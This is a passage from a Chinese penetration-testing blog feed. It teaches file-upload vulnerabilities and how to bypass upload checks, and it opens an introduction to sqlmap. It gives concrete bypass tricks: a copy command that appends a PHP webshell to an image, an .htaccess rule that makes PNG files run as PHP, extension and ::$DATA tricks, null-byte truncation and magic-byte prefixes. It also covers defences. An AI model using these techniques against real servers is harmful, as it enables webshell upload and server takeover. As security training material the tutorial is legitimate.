class="line">https://github.com/BeichenDream/Godzilla/releases</span><br></pre></td></tr></table></figure><h1 id="图片马"><a href="#图片马" class="headerlink" title="图片马"></a>图片马</h1><p>制作简单一句话图片马：</p><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment">#在php文件里面写了一句话木马，1.jpg是任意一张图片，将木马写入图片生成2.jpg</span></span><br><span class="line"><span class="built_in">copy</span> <span class="number">1</span>.jpg/b+<span class="number">1</span>.php/a <span class="number">2</span>.jpg</span><br></pre></td></tr></table></figure><blockquote><ul><li><code>/b</code>和<code>/a</code>是什么参数，可以参考<code>copy</code>命令的<code>help</code>，，，<code>/?</code></li><li>这种制作方式的本质是将webshell写入图片二进制文件末尾~~~</li><li>即使是图片马也得要被服务器解析后 才能利用哦</li></ul></blockquote><hr><h1 id="refer"><a href="#refer" class="headerlink" title="refer"></a>refer</h1><blockquote><p>- </p></blockquote><blockquote><p><strong>声明：</strong></p><ol><li><p>若文章存在错误，望诸君不吝指正^</p></li><li><p>部分笔记由于年代久远，做的笔记找不到最初是引用谁的，若是不允许引用转载，请联系我</p></li></ol></blockquote>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
          <category> WEB安全 </category>
          
          <category> 文件上传 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>0x08 - Web安全基础-文件上传</title>
      <link href="/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/WEB%E5%AE%89%E5%85%A8/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/0x08-Web%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0.html"/>
      <url>/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/WEB%E5%AE%89%E5%85%A8/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/0x08-Web%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="文件上传简介"><a href="#文件上传简介" class="headerlink" title="文件上传简介"></a>文件上传简介</h1><h2 id="什么是文件上传"><a href="#什么是文件上传" class="headerlink" title="什么是文件上传"></a>什么是文件上传</h2><p>将客户端数据以文件形式封装，通过网络协议发送到服务器端。在服务器端解析数据，最终在服务端硬盘上作为真实的文件保存。</p><p>通常一个文件以HTTP协议进行上传时，将以POST请求发送至Web服务器，Web服务器收到请求并同意后，用户与Web服务器将建立连接，并传输数据。</p><p><strong>先传过去数据的类型格式，再传输数据，等到数据传输到服务器，服务器端再对数据根据格式进行解析，保存</strong></p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202211131346595.png" alt="image-20221113134658335" style="zoom:50%;" /><h2 id="什么是文件上传漏洞"><a href="#什么是文件上传漏洞" class="headerlink" title="什么是文件上传漏洞"></a>什么是文件上传漏洞</h2><p>文件上传漏洞是指用户上传了一个<strong>可执行的脚本文件</strong>，并通过此脚本文件获得了执行服务器端命令的能力。这种攻击方式是最为直接和有效的，”文件上传”本身没有问题，有问题的是文件上传后，服务器怎么处理、解释文件。如果服务器端脚本语言未对上传的文件进行严格的<strong>验证和过滤</strong>，就容易造成上传任意文件的情况。</p><p>通常web站点会有<strong>用户注册功能</strong>，而当用户登录之后大多数情况下会存在类似<strong>头像上传</strong>、<strong>附件上传</strong>之类的功能，这些功能点往往存在上传验证方式不严格的安全缺陷，导致攻击者通过各种手段绕过验证，上传非法文件，这是在web渗透中非常关键的突破口。</p><p>文件上传可以通过burpsuite抓取POST包，注意包中的<code>boundary</code>字段</p><p>如抓取上传图片的包：PNG下面的乱码即为原始图片。，抓取的二进制可以通过<code>010edit（二进制编辑器）</code>复原</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202211131349174.png" alt="image-20221113134905942" style="zoom:50%;" /><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202211131349431.png" alt="image-20221113134926243" style="zoom:50%;" /><h2 id="文件上传产生漏洞的原因"><a href="#文件上传产生漏洞的原因" class="headerlink" title="文件上传产生漏洞的原因"></a>文件上传产生漏洞的原因</h2><ol><li>服务器配置不当</li><li>文件上传限制被绕过</li><li>开源编辑器的上传漏洞</li><li>文件解析漏洞导致文件执行</li><li>过滤不严或被绕过</li></ol><h2 id="文件上传漏洞危害"><a href="#文件上传漏洞危害" class="headerlink" title="文件上传漏洞危害"></a>文件上传漏洞危害</h2><p>攻击者通过上传恶意文件传递给解释器去执行，然后就可以在服务器上执行恶意代码，进行数据库执行、服务器文件管理、命令执行等恶意操作。从而控制整个网站及服务器。 这个恶意的文件（php、asp、aspx、jsp等），又被称<code>WebShell</code>。</p><h2 id="文件上传检测方式"><a href="#文件上传检测方式" class="headerlink" title="文件上传检测方式"></a>文件上传检测方式</h2><p>一般一个文件上传过程中的检测方式有：</p><ul><li>客户端JavaScript检测（检测文件扩展名）</li><li>服务端MIME类型检测（检测content-type内容）</li><li>服务端目录路径检测（检测跟path参数相关的内容）</li><li>服务端文件扩展名检测 (检测跟文件extension相关的内容)</li><li>服务端文件内容检测（检测内容是否合法是否含有恶意代码）</li></ul><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202211131810272.png" alt="文件上传检测及绕过" style="zoom: 25%;" /><h1 id="文件上传绕过"><a href="#文件上传绕过" class="headerlink" title="文件上传绕过"></a>文件上传绕过</h1><h2 id="判断文件上传检测类型"><a href="#判断文件上传检测类型" class="headerlink" title="判断文件上传检测类型"></a>判断文件上传检测类型</h2><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202211131747337.png" alt="image-20221113174756070" style="zoom:50%;" /><h2 id="绕过客户端检测-JS检测"><a href="#绕过客户端检测-JS检测" class="headerlink" title="绕过客户端检测(JS检测)"></a>绕过客户端检测(JS检测)</h2><h3 id="JS检测"><a href="#JS检测" class="headerlink" title="JS检测"></a>JS检测</h3><p>原理：</p><p>通常在上传页面里含有专门检测文件上传的 <code>JavaScript</code> 代码，最常见的就是检测文件类型和扩展名是否合法。</p><p>判断是否是客户端监测：</p><ul><li>首先在上传php类型文件的时候，进行抓包！如果没有抓取到任何信息，但是浏览器依旧拦截了我们上传文件，这就表名是在<strong>本地验证</strong>图片的格式，这个时候就只用在前端页面的代码中，查找对之进行验证</li><li>但是若被是抓包有信息，那就意味着我们的上传文件是通过服务端检测，就要用如下面绕过服务器端监测的方式进行绕过监测</li></ul><p>一般就是在js中，类似这种验证方式：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">checkfilesuffix</span>(<span class="params"></span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">var</span> file=<span class="variable language_">document</span>.<span class="title function_">getElementsByName</span>(<span class="string">&#x27;file&#x27;</span>)[<span class="number">0</span>][<span class="string">&#x27;value&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(file==<span class="string">&quot;&quot;</span>||file==<span class="literal">null</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title function_">swal</span>(<span class="string">&quot;请添加上传文件&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;error&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">var</span> whitelist=<span class="keyword">new</span> <span class="title class_">Array</span>(<span class="string">&quot;.jpg&quot;</span>,<span class="string">&quot;.png&quot;</span>,<span class="string">&quot;.gif&quot;</span>,<span class="string">&quot;.jpeg&quot;</span>);</span><br><span class="line">        <span class="keyword">var</span> file_suffix=file.<span class="title function_">substring</span>(file.<span class="title function_">lastIndexOf</span>(<span class="string">&quot;.&quot;</span>));</span><br><span class="line">        <span class="keyword">if</span>(whitelist.<span class="title function_">indexOf</span>(file_suffix) == -<span class="number">1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="title function_">swal</span>(<span class="string">&quot;只允许上传图片类型的文件!&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;error&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="绕过JS检测"><a href="#绕过JS检测" class="headerlink" title="绕过JS检测"></a>绕过JS检测</h3><p>方法：在本地浏览器客户端禁用 JS 即可；可使用火狐浏览器的 Noscript 插件、IE中禁用JS等方式实现，利用 burpsuite 可以绕过一切客户端检测。</p><blockquote><p>蚁景的一个文件上传靶场：<a href="http://120.27.61.239:8003/source/01/index.php">http://120.27.61.239:8003/source/01/index.php</a> </p></blockquote><h2 id="绕过服务端检测"><a href="#绕过服务端检测" class="headerlink" title="绕过服务端检测"></a>绕过服务端检测</h2><blockquote><p>服务端的代码通常检测三个点：MIME类型、文件内容、文件后缀</p></blockquote><h3 id="绕过MIME类型检测"><a href="#绕过MIME类型检测" class="headerlink" title="绕过MIME类型检测"></a>绕过MIME类型检测</h3><blockquote><p><strong>先简单介绍一下MIME：</strong></p><p>MIME最初创建之初是用在邮件上。后来被应用到多种协议里，包括我们常用的HTTP协议。</p><p><u>在访问网页时，MIME type帮助浏览器识别一个HTTP请求返回的是什么内容的数据，应该如何打开、如何显示。</u></p><p>MIME的常见形式是一个主类型加一个子类型，用斜线分隔。比如text&#x2F;html、application&#x2F;javascript、image&#x2F;png等。</p><p>浏览器通常使用 MIME 类型（而不是文件扩展名）来确定如何<strong>处理URL</strong>，因此 We b服务器在响应头中添加正确的 MIME 类型非常重要。如果配置不正确，浏览器可能会无法解析文件内容，网站将无法正常工作，并且下载的文件也会被错误处理。</p></blockquote><p>原理：检测图片类型文件上传过程中http包的 <code>Content-Type</code> 字段的值，来判断上传文件是否合法。</p><p>两种主要的 MIME 类型在默认类型中扮演了重要的角色：</p><ul><li><code>text/plain</code>表示文本文件的默认值。一个文本文件应当是人类可读的，并且不包含二进制数据。</li><li><code>application/octet-stream</code> 表示所有其他情况的默认值。一种未知的文件类型应当使用此类型。</li></ul><p>浏览器在处理这些文件时会特别小心, 试图防止、避免用户的危险行为。</p><figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">超文本标记语言文本 .html text/html</span><br><span class="line">普通文本 .txt text/plain</span><br><span class="line">PDF文档 .pdf application/pdf</span><br><span class="line">Microsoft Word文件 .word application/msword</span><br><span class="line">PNG图像 .png image/png</span><br><span class="line">GIF图形 .gif image/gif</span><br><span class="line">JPEG图形 .jpeg,.jpg image/jpeg</span><br><span class="line">au声音文件 .au audio/basic</span><br><span class="line">MPEG文件 .mpg,.mpeg video/mpeg</span><br><span class="line">AVI文件 .avi video/x-msvideo</span><br><span class="line">GZIP文件 .gz application/x-gzip</span><br></pre></td></tr></table></figure><p><strong>绕过方法：</strong>用burpsuite截取并修改数据包中文件的 <code>content-type</code> 类型进行绕过。</p><blockquote><p>蚁景靶场：<a href="http://120.27.61.239:8003/source/02/index.php">http://120.27.61.239:8003/source/02/index.php</a></p></blockquote><h3 id="绕过文件后缀检测"><a href="#绕过文件后缀检测" class="headerlink" title="绕过文件后缀检测"></a>绕过文件后缀检测</h3><h4 id="绕过黑名单策略："><a href="#绕过黑名单策略：" class="headerlink" title="绕过黑名单策略："></a>绕过黑名单策略：</h4><p>文件扩展名在黑名单中为不合法，一般有个专门的黑名单列表，里面会包含常见的危险脚本文件。但是总会有漏网之鱼，无法记录所有危险脚本后缀</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202211131513051.png" alt="image-20221113151316783" style="zoom: 33%;" /><p>绕过方法：</p><ol><li>后缀大小写绕过：(<code>.Php</code>)</li></ol><p>  在对后缀的判断中，如果只是对字符串进行单独的比较来判断是不是限制文件，可以采用后缀名大小写绕过形式。</p><ol start="2"><li>空格绕过：(<code>.php</code> )</li></ol><p>  如果黑名单没有对后缀名进行去空处理，可以通过在后缀名后加空进行绕过。</p><ol start="3"><li>点绕过：(<code>.php.</code>)</li></ol><p>  如果黑名单没有对后缀名进行去<code>.</code>处理，利用Windows系统的文件名特性，会自动去掉后缀名最后的<code>.</code>，通过在文件名后加<code>.</code>进行绕过。（Windows才可以）</p><ol start="4"><li><code>::$DATA</code> 绕过：</li></ol><p>  如果黑名单没有对后缀名进行去<code>::$DATA</code>处理，利用Windows下NTFS文件系统的一个特性，可以在后缀名后加<code>::$DATA</code>，绕过对黑名单的检测。在window的时候如果<code>文件名+&quot;::$DATA&quot;</code>会把<code>::$DATA</code>之后的数据当成<strong>文件流处理</strong>，不会检测后缀名，且保持<code>::$DATA</code>之前的文件名，他的目的就是不检查后缀名</p><p>  例如:<code>&quot;phpinfo.php::$DATA&quot;</code>Windows会自动去掉末尾的<code>::$DATA</code>变成<code>&quot;phpinfo.php&quot;</code></p><ol start="5"><li>配合中间件解析漏洞： （很少存在）</li></ol><p>  比如Apache解析有一个特点，解析文件时是从右往左判断，如果为不可识别解析再往左判断，如<code>aa.php.owf.rar</code>文件，Apache不可识别解析<code>.owf</code>和<code>.rar</code>这两种后缀，会解析成<code>.php</code>文件。</p><blockquote><p><a href="https://11pmsleep.github.io/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/WEB%E5%AE%89%E5%85%A8/%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E/%E5%B8%B8%E8%A7%81%E4%B8%AD%E9%97%B4%E4%BB%B6%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E.html#Apache-%E5%A4%9A%E5%90%8E%E7%BC%80%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E">常见中间件解析漏洞 | 晚上十一点睡觉 (11pmsleep.github.io)</a></p></blockquote><ol start="6"><li>配合<code>.htaccess</code> 文件 绕过</li></ol><p>  配合名单列表绕过，上传一个自定义的 <code>.htaccess</code> ，就可以轻松绕过各种检测。当然了，一般服务器并不会允许你上传<code>.htaccess</code>类型的文件~~~</p><blockquote><p><code>.htaccess</code> 文件(或者”分布式配置文件”）,全称是 <code>Hypertext Access</code> (超文本入口)。提供了针对目录改<br>变配置的方法， 即，在一个特定的文档目录中放置一个包含一个或多个指令的文件， 以作用于<strong>此目录及</strong><br><strong>其所有子目录</strong>。作为用户，所能使用的命令受到限制。 </p><p>比如新建一个 .htaccess 文件：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;FilesMatch &quot;as.png&quot;&gt;</span><br><span class="line">setHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure><blockquote><p><code>FileMatch</code>就是文件匹配的意思</p><p>该脚本作用是 ：将我们上传的php脚本后缀改为<code>.png</code>后，以<code>as.png</code>方式命名，该png文件会被解析为脚本执行</p><p>通过一个 <code>.htaccess</code>  文件调用 <code>php</code> 的解析器去解析一个文件名中只要包含 <code>as.png</code> 这个字符串的任意文件，所以无论文件名是什么样子，只要包含<code>as.png</code>这个字符串，都可以被以 <code>php脚本</code>  的方式来解析，一个自定义的 <code>.htaccess</code> 文件就可以以各种各样的方式去绕过很多上传验证机制。</p><p>我们只需要访问<code>as.php</code>即可在服务端将其解析成php达到我们的目的</p></blockquote></blockquote><blockquote><p>蚁景靶场：</p><p><a href="http://120.27.61.239:8003/source/04/index.php">http://120.27.61.239:8003/source/04/index.php</a> </p><p><a href="http://120.27.61.239:8003/source/06/index.php">http://120.27.61.239:8003/source/06/index.php</a></p></blockquote><h4 id="绕过白名单策略（比较难绕过）"><a href="#绕过白名单策略（比较难绕过）" class="headerlink" title="绕过白名单策略（比较难绕过）"></a>绕过白名单策略（比较难绕过）</h4><p>白名单策略：文件扩展名不在白名单中为不合法。</p><p><strong>绕过方法：</strong>白名单不好绕过，需要配合一些中间件漏洞才能绕过。服务端判断文件类型是从后往前判断，而对文件解析是从前往后解析，可以利用<strong>00截断</strong>的方式进行绕过，包括**%00截断<strong>与</strong>0x00截断**。 （php小于5.3.29）</p><blockquote><ul><li><code>%00</code>截断：</li></ul><p>url发送到服务器后被服务器解码，这时还没有传到验证函数，也就是说验证函数里接收到的不是<code>%00</code>字符，而是<code>%00</code>解码后的内容，即解码成了<code>0x00</code>。</p><ul><li><code>0x00</code>截断：</li></ul><p>系统在对文件名进行读取时，如果遇到<code>0x00</code>，就会认为读取已经结束。但要注意是文件的十六进制内容里的<code>00</code>，而不是文件名中的<code>00</code></p></blockquote><h2 id="绕过文件内容检测"><a href="#绕过文件内容检测" class="headerlink" title="绕过文件内容检测"></a>绕过文件内容检测</h2><p>一般通过检测文件内容来判断上传文件是否合法。</p><p>主要有两种检测方法：</p><blockquote><ul><li>文件幻数检测</li><li>文件加载检测</li></ul></blockquote><h3 id="绕过文件幻数检测"><a href="#绕过文件幻数检测" class="headerlink" title="绕过文件幻数检测"></a>绕过文件幻数检测</h3><h4 id="原理："><a href="#原理：" class="headerlink" title="原理："></a><strong>原理：</strong></h4><p>通过检测上传文件内容开始处的文件幻数来判断的话，可以通过类似我们前面制作的图片马这种方式绕过。</p><p>通常情况下，通过判断<strong>前10个字节</strong>，基本就能判断出一个文件的真实类型。主要是检测文件内容开始处的文件幻数文件格式幻数（外语：magic number），它可以用来标记文件或者协议的格式，很多文件都有幻数标志来表明该文件的格式。</p><p>常见图片类型的文件幻数如下：</p><ol><li>要绕过 jpg 文件幻数检测就要在文件开头写上下面的值：</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Value = FF D8 FF E0 00 10 4A 46 49 46</span><br></pre></td></tr></table></figure><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202211131534297.png" alt="image-20221113153404078" style="zoom:50%;" /><ol start="2"><li>要绕过 gif 文件幻数检测就要在文件开头写上下面的值：</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Value = 47 49 46 38 39 61</span><br></pre></td></tr></table></figure><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202211131534082.png" alt="image-20221113153421891" style="zoom:50%;" /><ol start="3"><li>要绕过 png 文件幻数检测就要在文件开头写上下面的值：</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Value = 89 50 4E 47</span><br></pre></td></tr></table></figure><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202211131534085.png" alt="image-20221113153436870" style="zoom:50%;" /><h4 id="绕过："><a href="#绕过：" class="headerlink" title="绕过："></a><strong>绕过：</strong></h4><p>在文件幻数后面加上自己的一句话木马代码就行了。</p><p>如前面我们抓取的这个POST请求的包，前面就是典型的<code>89 50 4E 47</code></p><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202211131535146.png" alt="image-20221113153539925"></p><blockquote><p>蚁景靶场： <a href="http://120.27.61.239:8003/source/03/index.php">http://120.27.61.239:8003/source/03/index.php</a></p></blockquote><h3 id="绕过文件加载检测（难绕过）"><a href="#绕过文件加载检测（难绕过）" class="headerlink" title="绕过文件加载检测（难绕过）"></a>绕过文件加载检测（难绕过）</h3><h4 id="原理：-1"><a href="#原理：-1" class="headerlink" title="原理："></a>原理：</h4><p>一般是调用API或函数对文件进行加载测试。常见的是图像渲染测试，再严格点的甚至是进行二次渲染、或者对图片进行剪切处理。这种渲染就是图片的展示效果不变，但是内容的二进制或者是代码会被破坏原有的结构，变成其他内容，会乱码。也就大概率破坏了脚本内容，致使无法解析。</p><h4 id="对图像渲染加载检测的绕过"><a href="#对图像渲染加载检测的绕过" class="headerlink" title="对图像渲染加载检测的绕过"></a>对图像渲染加载检测的绕过</h4><p>可以用图像处理软件对一张图片进行代码注入。在不破坏文件本身的渲染情况下找一个空白区进行填充代码，一般是图片的注释区，这样能保证本身文件结构是完整的，对于渲染测试基本上都能绕过。（绕过原理是，渲染不会对空白区域进行渲染）</p><p>步骤：</p><ol><li>上传前的文件和将上传后下载下来的文件，进行内容逐个比较（010editor）</li><li>找出上传前后内容不变的区域</li><li>利用图片对比工具，查找出内容一样的区域</li><li>在不变的地方插入一句话木马</li></ol><blockquote><p>主要利用的是查找渲染前后不变的区域，在此区域进行改写，不会被渲染加载所改变内容</p></blockquote><h4 id="二次渲染加载检测的绕过-攻击文件加载器自身"><a href="#二次渲染加载检测的绕过-攻击文件加载器自身" class="headerlink" title="二次渲染加载检测的绕过 - 攻击文件加载器自身"></a>二次渲染加载检测的绕过 - 攻击文件加载器自身</h4><p>二次渲染相当麻烦，非常不好绕过。</p><p>这种情况下无法用代码注入绕过，二次渲染相当于把原本属于图像数据的部分抓出来，在用自己的API或函数进行重新渲染，而非图像数据部分直接被隔离开了。</p><p>我们可以用溢出攻击对文件加载器进行攻击，上传自己的恶意文件后，服务器上的文件加载器会主动进行加载测试，加载测试时被溢出攻击执行<code>shellcode</code>。</p><blockquote><p>暂时搞不来这一点，以后再回头学</p></blockquote><h2 id="条件竞争"><a href="#条件竞争" class="headerlink" title="条件竞争"></a>条件竞争</h2><p>条件竞争，就是看你脚本在服务器创建文件的速度和检测删除的速度谁更快！！</p><h1 id="文件上传漏洞总结"><a href="#文件上传漏洞总结" class="headerlink" title="文件上传漏洞总结"></a>文件上传漏洞总结</h1><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202211131723702.png" alt="image-20221113172358420"></p><h1 id="文件上传漏洞防御"><a href="#文件上传漏洞防御" class="headerlink" title="文件上传漏洞防御"></a>文件上传漏洞防御</h1><ol><li>文件上传的目录设置为不可执行</li></ol><p>只要web容器无法解析该目录下面的文件，即使攻击者上传了脚本文件，服务器本身也不会受到影响，这一点至关重要。</p><ol start="2"><li>判断文件类型</li></ol><p>在判断文件类型时，可以结合使用MIME-Type、后缀检查等方式。在文件类型检查中，强烈推荐白名单方式，黑名单的方式已经无数次被证明是不可靠的。此外，对于图片的处理，可以使用压缩函数或者resize函数，在处理图片的同时破坏图片中可能包含的HTML代码。</p><ol start="3"><li>使用随机数改写文件名和文件路径</li></ol><p>文件上传如果要执行代码，则需要用户能够访问到这个文件。在某些环境中，用户能上传，但不能访问。如果应用了随机数改写了文件名和路径，将极大地增加攻击的成本。再来就是像shell.php.rar.rar和crossdomain.xml这种文件，都将因为重命名而无法攻击。</p><ol start="4"><li>单独设置文件服务器的域名</li></ol><p>由于浏览器同源策略的关系，一系列客户端攻击将失效，比如上传crossdomain.xml、上传包含Javascript的XSS利用等问题将得到解决。</p><hr><h1 id="refer"><a href="#refer" class="headerlink" title="refer"></a>refer</h1><blockquote><ul><li><a href="https://www.cnblogs.com/korea/p/11787460.html">常见MIME类型列表整理 - korea - 博客园 (cnblogs.com)</a></li><li><a href="https://blog.csdn.net/weixin_44032232/article/details/109005766">【文件上传绕过】八、::$DATA上传绕过_多学点技术的博客-CSDN博客</a></li><li><a href="https://www.zhihu.com/question/60495696">既然有文件后缀名,为何还需要MIME类型? - 知乎 (zhihu.com)</a></li><li><a href="https://www.runoob.com/http/mime-types.html">MIME 类型 | 菜鸟教程 (runoob.com)</a></li></ul><p><strong>文件上传实验靶场</strong></p><ul><li><p>蚁景网安靶场：<a href="http://120.27.61.239:8003/">蚁景 Lab</a></p></li><li><p>课程:文件上传实战靶场Upload-labs<br><a href="https://www.hetianlab.com/cour.do?w=1&amp;c=CCID53b1-3601-49e1-890e-3db12c192adc">https://www.hetianlab.com/cour.do?w=1&amp;c=CCID53b1-3601-49e1-890e-3db12c192adc</a></p></li><li><p>实验:IIS解析漏洞在fckEditor上传攻击中的利用<br><a href="https://www.hetianlab.com/expc.do?ec=ECID172.19.104.182015102217243800001">https://www.hetianlab.com/expc.do?ec=ECID172.19.104.182015102217243800001</a></p></li><li><p>实验:Apache解析漏洞<br><a href="https://www.hetianlab.com/expc.do?ec=ECID172.19.104.182015120111342100001">https://www.hetianlab.com/expc.do?ec=ECID172.19.104.182015120111342100001</a></p></li><li><p>实验:Nginx解析安全与实战测试<br><a href="https://www.hetianlab.com/expc.do?ec=ECID218.76.35.762014021910351300001">https://www.hetianlab.com/expc.do?ec=ECID218.76.35.762014021910351300001</a></p></li></ul></blockquote><blockquote><p><strong>声明：</strong></p><ol><li><p>若文章存在错误，望诸君不吝指正^</p></li><li><p>部分笔记由于年代久远，做的笔记找不到最初是引用谁的，若是不允许引用转载，请联系我</p></li></ol></blockquote>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
          <category> WEB安全 </category>
          
          <category> 文件上传 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Sqlmap学习</title>
      <link href="/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/WEB%E5%AE%89%E5%85%A8/SQL%E6%B3%A8%E5%85%A5/Sqlmap%E5%AD%A6%E4%B9%A0.html"/>
      <url>/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/WEB%E5%AE%89%E5%85%A8/SQL%E6%B3%A8%E5%85%A5/Sqlmap%E5%AD%A6%E4%B9%A0.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>sql注入神奇——sqlmap</p><h1 id="SQLMAP简介"><a href="#SQLMAP简介" class="headerlink" title="SQLMAP简介"></a>SQLMAP简介</h1><p>SQLMAP 是一个开源的渗透测试工具，可以用来自动化的检测，利用 SQL 注入漏洞，获取数据库服务器的权限。它具有功能强大的检测引擎,针对各种不同类型数据库的渗透测试的功能选项，包括获取数据库中存储的数据，访问操作系统文件甚至可以通过外带数据连接的方式执行操作系统命令。</p><h2 id="链接"><a href="#链接" class="headerlink" title="链接"></a>链接</h2><blockquote><p>官方网址：<a href="http://sqlmap.org/">http://sqlmap.org</a><br>github地址：<a href="https://github.com/sqlmapproject/sqlmap/blob/master/doc/translations/README-zh-CN.md">https://github.com/sqlmapproject/sqlmap/blob/master/doc/translations/README-zh-CN.md</a><br>使用手册：<a href="https://github.com/sqlmapproject/sqlmap/wiki/Usage">https://github.com/sqlmapproject/sqlmap/wiki/Usage</a></p></blockquote><h2 id="SQLMAP支持的注入模式"><a href="#SQLMAP支持的注入模式" class="headerlink" title="SQLMAP支持的注入模式"></a>SQLMAP支持的注入模式</h2><p>SQLMAP  能够检测和利用五种不同的 SQL  注入类型。</p><blockquote><ul><li>基于布尔的盲注：即可以根据返回页面判断条件真假的注入</li><li>基于时间的盲注：即不能根据页面返回内容判断任何信息，用条件语句查看时间延迟语句是否执行（即页面返回时间是否增加）来判断。</li><li>基于报错注入：即页面会返回错误信息，或者把注入的语句的结果直接返回在页面中</li><li>联合查询注入：可以使用union的情况下的注入。</li><li>堆叠查询注入：可以同时执行多条语句的执行时的注入。</li></ul></blockquote><p>除了上述五种类型外，还支持：</p><blockquote><ul><li>在数据库证书、IP 地址、端口和数据库名等条件允许的情况下支持不通过 SQL 注入点而直接连接数据库。</li><li>支持枚举用户、密码、哈希、权限、角色、数据库、数据表和列。</li><li>支持自动识别密码哈希格式并通过字典破解密码哈希。</li><li>支持完全地下载某个数据库中的某个表，也可以只下载某个表中的某几列，甚至只下载某一列中的部分数据，这完全取决于用户的选择。</li><li>支持在数据库管理系统中搜索指定的数据库名、表名或列名</li><li>当数据库管理系统是 MySQL、PostgreSQL 或 Microsoft SQL Server 时支持下载或上传文件。</li><li>当数据库管理系统是 MySQL、PostgreSQL 或 Microsoft SQL Server 时支持执行任意命令并回现标准输出。</li></ul></blockquote><h2 id="SQLMAP支持的数据库"><a href="#SQLMAP支持的数据库" class="headerlink" title="SQLMAP支持的数据库"></a>SQLMAP支持的数据库</h2><blockquote><p>MySQL Oracle PostgreSQL Microsoft SQL Server Microsoft Access IBM DB2 SQLite Firebird Sybase SAP MaxDB</p></blockquote><h2 id="SQLMAP安装"><a href="#SQLMAP安装" class="headerlink" title="SQLMAP安装"></a>SQLMAP安装</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Linux：</span><br><span class="line">git <span class="built_in">clone</span> --depth 1 </span><br><span class="line">https://github.com/sqlmapproject/sqlmap.git sqlmap-dev</span><br><span class="line">Windows：</span><br><span class="line">下载源码 http://sqlmap.org</span><br><span class="line">更新：</span><br><span class="line">python sqlmap.py –update</span><br></pre></td></tr></table></figure><h2 id="查看-SQLMAP-的版本信息："><a href="#查看-SQLMAP-的版本信息：" class="headerlink" title="查看 SQLMAP 的版本信息："></a>查看 SQLMAP 的版本信息：</h2><h3 id="kali下面的sqlmap"><a href="#kali下面的sqlmap" class="headerlink" title="kali下面的sqlmap"></a>kali下面的sqlmap</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"> #</span><span class="language-bash">检查 SQLMAP 版本：</span></span><br><span class="line"> sqlmap -v</span><br><span class="line"><span class="meta prompt_"> </span></span><br><span class="line"><span class="meta prompt_"> #</span><span class="language-bash">查看 SQLMAP 环境：</span></span><br><span class="line">cd /usr/share/sqlmap/</span><br><span class="line"></span><br><span class="line">重要的目录介绍</span><br><span class="line">data:里面包含了一些数据库及字典文件等；</span><br><span class="line">extra:这里包含了 sqlmap 的多种额外功能，例如发出声响（beep)、运行 cmd、安全执行、shellcode等。</span><br><span class="line">lib:这里包含了 sqlmap 的多种连接库，如五种注入类型请求的参数、提权操作等。</span><br><span 